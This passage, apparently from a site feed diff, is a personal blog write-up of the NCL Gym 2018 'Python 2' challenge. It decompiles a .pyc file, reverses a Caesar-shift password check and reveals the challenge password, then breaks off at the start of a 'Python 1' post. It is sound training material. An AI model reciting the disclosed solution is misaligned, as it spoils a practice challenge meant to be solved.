+&lt;p&gt;Ugh. I should have put that into a file or something. Run it again but do it better!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uncompyle6 PYTHON2.pyc &amp;gt; thisisthecode.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Head over to sublime text and browse on over to find this beautiful python code that I can actually work with.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Invalid args'&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tfzbwlyzljylawhzzdvyk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'incorrect'&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'incorrect'&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'correct'&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Okay okay. Let’s try to figure this sucker out. Diving in section by section.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-pyhton&quot;&gt;vals = list('tfzbwlyzljylawhzzdvyk')
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;turns tfzbwlyzljylawhzzdvyk into a list of each letter. so vals[2], the third item in the vals list is z. For example:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;if your password isn’t the length of the vals list then no go.&lt;/p&gt;
+
+&lt;p&gt;Checking the length of val&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;len('tfzbwlyzljylawhzzdvyk')
+&amp;gt;&amp;gt;&amp;gt;21
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So the password is 21 characters.&lt;/p&gt;
+
+&lt;p&gt;If you’ve got that far then it runs a while loop.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Starting at the first position, do stuff until we get to the end. Okay simple. So far we are just setting up the parameters of the length of the password and telling the code to check each character until we get to the end. Nothing really important yet.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This is interesting. It looks at the current letter and makes the ord and adds 7 to it. And then sets it to a variable called X. So basically, make the letters into numbers and move them up 7.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;this is where you can imagine and assume that this letters to numbers thing is going to at some point be undone. Go ahead and imagine that. Good. Got it? For example, a password of ‘aaa’ would ord into something like ‘111’ and then we add 7 to make it ‘888’ and then back to letters ‘hhh’. Hmm. Whatever that’s weird.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Moving on.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Basically if we get to z, go back to a. &lt;br /&gt;
+This is here so that after the letter z we loop back to a.&lt;/p&gt;
+
+&lt;p&gt;This next part is the part that matters most.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So far we have done a lot with shifting things back and forth. So at first glance, this looks confusing, but it basically says, letter for letter, our manipulated password (the plus 7 ord stuff) needs to equal the string in val. Or at least that is what it looks like.&lt;/p&gt;
+
+&lt;p&gt;Of course I wrote a test code. I commented some things in the code, but most importantly, before the last if, and before the if statement that loops things back, I print both the vals[counter] and the chr(x)&lt;/p&gt;
+
+&lt;p&gt;I then comment out the last if completely so it doesn’t stop running.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Invalid args'&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;#counts the length                         
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tfzbwlyzljylawhzzdvyk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#list() converts a string into a list made up of the letters
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#password must be 21 characters
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'length of the password must be 21 letters'&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#moving through the letters
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#add 7 to the ord of the letter
+&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# this is our test code here
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;#Back to normal code
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# when the ord hits lowercase z, move x back
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;#if chr(x) != vals[counter]: #if the current letter does not equal the counter
+&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;# print 'counter has to equal the thing'
+&lt;/span&gt;
+           &lt;span class=&quot;c1&quot;&gt;# return
+&lt;/span&gt;        
+        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+    
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I run it.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+$ python PYTHON2-test.py aaaaaaaaaaaaaaaaaaaaa
+t
+h
+f
+h
+z
+h
+b
+h
+w
+h
+l
+h
+y
+h
+z
+h
+l
+h
+j
+h
+y
+h
+l
+h
+a
+h
+w
+h
+h
+h
+z
+h
+z
+h
+d
+h
+v
+h
+y
+h
+k
+h
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;so. Remember it’s doing a single character print of the vals[counter] then chr(x) and repeating. so every odd character is vals[counter] and every even is chr(x). So split it up and line them side by side and see what we get.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;t h
+f h
+z h
+b h
+w h
+l h
+y h
+z h
+l h
+j h
+y h
+l h
+a h
+w h
+h h
+z h
+z h
+d h
+v h
+y h
+k h
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Weirdddd. It worked just like we thought it maybe would. And remember we are printed these two lines of letters because they have to match.&lt;/p&gt;
+
+&lt;p&gt;Weeelllll.&lt;/p&gt;
+
+&lt;p&gt;Then maybe we can flip the code?&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;I know we could do this with pencil and paper but why not try to use this code that is already in front of us?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;change it to&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and of course we have to flip&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; 
+            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;to&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Remember, this is there so that if the counter goes past z, make it start back at a.&lt;/p&gt;
+
+&lt;p&gt;so the oppsite would be: if it subtracts below a, push it back up to z.
+And while we are here let’s delete the code we put in the print their string. No need.&lt;/p&gt;
+
+&lt;p&gt;Now let’s put in their string as the input and see what comes out.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;m
+_
+s
+[
+p
+e
+r
+s
+e
+c
+r
+e
+Z
+p
+a
+s
+s
+]
+o
+r
+d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Eh. it’s not quite looping back the way we want it to. &lt;br /&gt;
+But wait. let’s look at it for a second. &lt;br /&gt;
+&lt;code&gt;m_s[persecreZpass]ord&lt;/code&gt;&lt;br /&gt;
+So. Maybe I’m not the best with Python and I messed something up   somewhere. But. It’s clear that the password is something in like likes of:&lt;br /&gt;
+ &lt;code&gt;mysupersecretpassword&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s try it.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python PYTHON2.py mysupersecretpassword
+correct
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;lolll.&lt;/p&gt;
+
+&lt;p&gt;Okay done.&lt;/p&gt;
+
+&lt;p&gt;-Cheers&lt;/p&gt;
+
+&lt;p&gt;Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 1’</title><link href="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 1’" /><published>2018-04-02T18:33:00-04:00</published><updated>2018-04-02T18:33:00-04:00</updated><id>http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1</id><content type="html" xml:base="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html">&lt;h1 id=&quot;ncl-gym-2018---enumeration-and-exploitation-python-1&quot;&gt;NCL Gym 2018 - Enumeration and Exploitation Python 1&lt;/h1&gt;
+
+&lt;p&gt;This flag is a Python password flag. Figure out what the password should be to satisfy the if statement. Easy.&lt;/p&gt;
+
+&lt;p&gt;Here is the code.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
